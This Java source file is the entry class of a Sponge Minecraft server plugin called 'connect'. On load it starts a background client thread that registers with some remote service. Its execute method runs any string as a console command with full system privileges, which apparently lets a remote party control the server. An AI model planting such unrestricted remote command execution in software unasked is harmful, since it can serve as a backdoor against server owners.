package br.com.introcdc.connect.client.server;
/*
 * Written by IntroCDC, Bruno Coelho at 11/09/2026 - 17:42
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import org.spongepowered.api.Sponge;
import org.spongepowered.api.event.Listener;
import org.spongepowered.api.event.lifecycle.ConstructPluginEvent;
import org.spongepowered.plugin.builtin.jvm.Plugin;

@Plugin("connect")
public class SpongeMain {

    @Listener
    public void onConstructPlugin(ConstructPluginEvent event) {
        Connect.FOLDER = "config/";
        Connect.updateRegister(null);
        new Thread(ConnectClient::registerAndStart).start();
    }

    public static void execute(String command) {
        try {
            Sponge.server().commandManager().process(Sponge.systemSubject(), command);
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

}
